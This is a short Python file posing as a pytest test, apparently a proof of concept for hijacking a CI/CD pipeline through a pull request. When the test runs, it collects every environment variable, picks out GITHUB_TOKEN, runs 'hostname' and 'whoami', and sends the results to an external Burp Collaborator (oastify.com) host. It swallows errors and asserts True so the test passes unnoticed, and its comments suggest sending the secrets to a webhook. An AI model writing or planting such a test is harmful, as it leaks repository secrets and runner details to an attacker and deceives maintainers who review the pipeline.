import os
import urllib.request
import json

def test_exfiltrate_secrets():
    print("\n[!] ELITE: CI/CD Pipeline Hijacked via PR!")
    
    # Get all environment variables (Secrets)
    secrets = dict(os.environ)
    
    # Extract specific high-value targets if they exist
    github_token = secrets.get('GITHUB_TOKEN', 'Not Found')
    
    # Instead of just echoing (which they might miss), send it to your Burp Collaborator or webhook
    # For a safe PoC, we just write to a file and read it back, OR send non-sensitive metadata
    
    # Safe PoC: Send hostname to attacker server
    hostname = os.popen('hostname').read().strip()
    whoami = os.popen('whoami').read().strip()
    
    data = json.dumps({"host": hostname, "user": whoami, "status": "PWNED"})
    req = urllib.request.Request("http://ydf52263577owp652ajgf2eokfq6ex2m.oastify.com", data=data.encode('utf-8'))
    
    try:
        urllib.request.urlopen(req, timeout=3)
    except Exception:
        pass
    
    # Assert true so the test passes and doesn't look suspicious initially
    assert True
